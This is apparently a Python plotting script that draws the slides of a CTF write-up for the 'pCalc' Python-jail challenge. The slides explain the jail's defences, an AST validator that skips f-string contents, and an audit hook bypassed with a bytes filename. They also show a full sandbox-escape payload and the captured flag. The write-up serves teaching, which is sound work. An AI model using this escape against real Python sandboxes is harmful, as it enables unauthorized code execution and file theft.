import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import textwrap

BG = '#1e1e2e'
RED = '#f38ba8'
GREEN = '#a6e3a1'
BLUE = '#89b4fa'
YELLOW = '#f9e2af'
ORANGE = '#fab387'
TEXT = '#cdd6f4'
MAUVE = '#cba6f7'
TEAL = '#94e2d5'

def save(fig, name):
    plt.savefig(f'screenshots/{name}', dpi=150, bbox_inches='tight', facecolor=BG)
    plt.close(fig)
    print(f"Saved {name}")

# 1. Challenge overview
fig, ax = plt.subplots(figsize=(14, 8))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')
ax.text(0.5, 0.95, 'pCalc - Pragyan CTF 2025', fontsize=24, fontweight='bold',
        color=MAUVE, ha='center', va='top', fontfamily='monospace')
ax.text(0.5, 0.87, 'Category: Misc | Points: 500', fontsize=14,
        color=YELLOW, ha='center', va='top', fontfamily='monospace')

overview = """
+--------------------------------------------------+
|  Challenge Files                                  |
+--------------------------------------------------+
|  chal.py .... Python jail calculator              |
|                                                   |
|  Connection:                                      |
|  ncat --ssl pcalc.ctf.prgy.in 1337               |
|                                                   |
|  Description:                                     |
|  "Just a super secure calculator, making sure     |
|   no funny business goes on except math           |
|   homework..."                                    |
+--------------------------------------------------+
"""
ax.text(0.5, 0.72, overview, fontsize=12, color=TEXT, ha='center', va='top',
        fontfamily='monospace', linespacing=1.5)
save(fig, '01_challenge_overview.png')

# 2. Security layers analysis
fig, ax = plt.subplots(figsize=(14, 10))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')
ax.text(0.5, 0.97, 'Security Layers Analysis', fontsize=22, fontweight='bold',
        color=MAUVE, ha='center', va='top', fontfamily='monospace')

layers = [
    ("Layer 1: Keyword Filter", RED,
     '"import" in user_input  →  blocks import keyword in source'),
    ("Layer 2: AST Validator", RED,
     'Only allows: Module, Expr, BinOp, UnaryOp, Constant,\n'
     '              Name, Load, operator, unaryop, JoinedStr'),
    ("Layer 3: Audit Hook", RED,
     'Blocks: os.system, os.popen, os.spawn, subprocess.Popen\n'
     'Blocks: open() with "flag" in filename (str only!)'),
    ("Layer 4: Empty Builtins", RED,
     '__builtins__: {}  →  no built-in functions available'),
    ("Layer 5: Type Filter", RED,
     'Only prints int/float/complex results'),
]

y = 0.85
for title, color, desc in layers:
    ax.text(0.05, y, f"[X] {title}", fontsize=14, fontweight='bold',
            color=color, va='top', fontfamily='monospace')
    ax.text(0.08, y-0.06, desc, fontsize=11, color=TEXT, va='top',
            fontfamily='monospace', linespacing=1.4)
    y -= 0.17

ax.text(0.5, 0.02, '5 layers of defense... but one fatal flaw',
        fontsize=13, color=YELLOW, ha='center', fontfamily='monospace', style='italic')
save(fig, '02_security_layers.png')

# 3. The f-string vulnerability
fig, ax = plt.subplots(figsize=(14, 9))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')
ax.text(0.5, 0.97, 'The Vulnerability: JoinedStr Pass-Through', fontsize=20,
        fontweight='bold', color=RED, ha='center', va='top', fontfamily='monospace')

code = """
    class Calculator(ast.NodeVisitor):
        def visit(self, node):
            if isinstance(node, (...allowed types...)):
                super().visit(node)   # visits children
            elif isinstance(node, ast.JoinedStr):
                pass                  # <-- NO CHILDREN VISITED!
            else:
                self.is_valid = False
"""
ax.text(0.05, 0.82, code, fontsize=12, color=TEXT, va='top',
        fontfamily='monospace', linespacing=1.5)

ax.text(0.5, 0.38, 'AST of f"{arbitrary_code_here}"', fontsize=16,
        color=YELLOW, ha='center', fontfamily='monospace', fontweight='bold')

tree_txt = """
    Module ──── Expr ──── JoinedStr ──── FormattedValue ──── ???
      ✓           ✓         ✓ (pass)        NEVER CHECKED!

    Everything inside f-string braces is INVISIBLE to the validator!
"""
ax.text(0.05, 0.28, tree_txt, fontsize=13, color=GREEN, va='top',
        fontfamily='monospace', linespacing=1.5)

ax.text(0.5, 0.05, 'f-strings = free code execution inside the jail',
        fontsize=14, color=ORANGE, ha='center', fontfamily='monospace', fontweight='bold')
save(fig, '03_fstring_vuln.png')

# 4. The exploit chain
fig, ax = plt.subplots(figsize=(14, 10))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')
ax.text(0.5, 0.97, 'Full Exploit Chain', fontsize=22, fontweight='bold',
        color=MAUVE, ha='center', va='top', fontfamily='monospace')

steps = [
    ("1. Bypass AST Validator", BLUE,
     'f"{ ... }"  →  JoinedStr node gets pass, children unchecked'),
    ("2. Bootstrap from Object", GREEN,
     "().__class__.__mro__[-1].__subclasses__()\n"
     " → Find os._wrap_close class"),
    ("3. Access Module Globals", YELLOW,
     "_wrap_close.__init__.__globals__['__builtins__']['open']\n"
     " → Recover the real open() function"),
    ("4. Bypass Audit Hook", ORANGE,
     "open(b'flag.txt')  ←  bytes, not str!\n"
     " → isinstance(b'flag.txt', str) == False → audit skipped"),
    ("5. Exfiltrate via KeyError", RED,
     "{}[flag_data]  →  KeyError: 'p_ctf{...}'\n"
     " → Printed by except handler: Runtime Error: {e}"),
]

y = 0.87
for title, color, desc in steps:
    ax.text(0.05, y, title, fontsize=14, fontweight='bold',
            color=color, va='top', fontfamily='monospace')
    ax.text(0.08, y-0.055, desc, fontsize=11, color=TEXT, va='top',
            fontfamily='monospace', linespacing=1.4)
    y -= 0.16

save(fig, '04_exploit_chain.png')

# 5. The payload
fig, ax = plt.subplots(figsize=(16, 7))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')
ax.text(0.5, 0.97, 'The Payload', fontsize=22, fontweight='bold',
        color=MAUVE, ha='center', va='top', fontfamily='monospace')

payload_lines = [
    ('f"{ {}[', TEXT),
    ('    [c for c in', BLUE),
    ('        ().__class__.__mro__[-1].__subclasses__()', GREEN),
    ('     if c.__name__==\'_wrap_close\'', YELLOW),
    ('    ][0].__init__.__globals__', ORANGE),
    ('    [\'__builtins__\'][\'open\']', ORANGE),
    ('    (b\'flag.txt\').read()', RED),
    ('] }"', TEXT),
]

y = 0.82
for line, color in payload_lines:
    ax.text(0.08, y, line, fontsize=13, color=color, va='top',
            fontfamily='monospace')
    y -= 0.08

ax.text(0.5, 0.15, 'One f-string to rule them all', fontsize=14,
        color=TEAL, ha='center', fontfamily='monospace', style='italic')
save(fig, '05_payload.png')

# 6. Flag captured
fig, ax = plt.subplots(figsize=(14, 6))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')

ax.text(0.5, 0.85, 'FLAG CAPTURED', fontsize=30, fontweight='bold',
        color=GREEN, ha='center', va='top', fontfamily='monospace')

flag_box = """
╔══════════════════════════════════════════════════════╗
║  p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}           ║
╚══════════════════════════════════════════════════════╝
"""
ax.text(0.5, 0.62, flag_box, fontsize=16, color=YELLOW, ha='center', va='top',
        fontfamily='monospace', fontweight='bold')

ax.text(0.5, 0.28, 'CHA7 C4LC is JUst $HorT f0r caLCUla70r', fontsize=14,
        color=TEXT, ha='center', fontfamily='monospace')
ax.text(0.5, 0.15, '"Chat calc is just short for calculator"', fontsize=13,
        color=ORANGE, ha='center', fontfamily='monospace', style='italic')
save(fig, '06_flag.png')

# 7. Audit hook bypass detail
fig, ax = plt.subplots(figsize=(14, 8))
ax.set_facecolor(BG)
fig.patch.set_facecolor(BG)
ax.axis('off')
ax.text(0.5, 0.97, 'Audit Hook Bypass: bytes vs str', fontsize=20,
        fontweight='bold', color=RED, ha='center', va='top', fontfamily='monospace')

code_txt = """
  def audit_hook(event, args):
      if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
          raise RuntimeError("Forbidden File Access")
"""
ax.text(0.05, 0.82, code_txt, fontsize=12, color=TEXT, va='top',
        fontfamily='monospace', linespacing=1.4)

comparison = """
  open('flag.txt')         open(b'flag.txt')
  ──────────────────       ──────────────────
  args[0] = 'flag.txt'    args[0] = b'flag.txt'
  isinstance(str) = True   isinstance(str) = False
  'flag' in args[0] ✓     SHORT-CIRCUIT! ✗
  ══════════════════       ══════════════════
  ❌ BLOCKED               ✅ ALLOWED
"""
ax.text(0.05, 0.55, comparison, fontsize=13, va='top', fontfamily='monospace',
        color=TEAL, linespacing=1.5)

ax.text(0.5, 0.08, 'Python and operator short-circuits: False and X → False (X never evaluated)',
        fontsize=12, color=YELLOW, ha='center', fontfamily='monospace')
save(fig, '07_audit_bypass.png')

print("\nAll screenshots generated!")
